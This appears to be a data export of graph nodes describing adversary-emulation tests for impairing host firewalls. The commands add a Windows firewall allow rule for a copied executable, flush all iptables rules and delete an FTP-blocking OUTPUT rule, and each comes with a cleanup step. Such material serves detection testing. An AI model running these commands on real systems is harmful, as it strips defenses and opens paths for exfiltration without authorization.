nodes.description: Copy-Item "#{exe_file_path}" -Destination "C:\Users\$env:UserName" -Force netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes

nodes.name: Cleanup for Allow Executable Through Firewall Located in Non-Standard Location
nodes.description: netsh advfirewall firewall delete rule name="Atomic Test" | Out-Null Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore

nodes.name: Disable iptables
nodes.description: Some Linux systems may not activate ufw, but use iptables for firewall rules instead. (ufw works on top of iptables.) Attackers cannot directly disable iptables, as it is not implemented as a service like ufw. But they can flush all iptables rules, which in fact "disable" iptables.

nodes.name: Command for Disable iptables
nodes.description: iptables-save > /tmp/iptables.rules iptables -F

nodes.name: Cleanup for Disable iptables
nodes.description: iptables-restore < /tmp/iptables.rules

nodes.name: Modify/delete iptables firewall rules
nodes.description: Instead of completely "disabling" iptables, adversaries may choose to delete a certain rule, which, for example, blocks data exfiltration via ftp. By doing so, they may cause less noise to avoid detection.

nodes.name: Command for Modify/delete iptables firewall rules
nodes.description: iptables -D OUTPUT -p tcp --dport 21 -j DROP

nodes.name: Cleanup for Modify/delete iptables firewall rules
nodes.description: iptables-restore < /tmp/iptables.rules
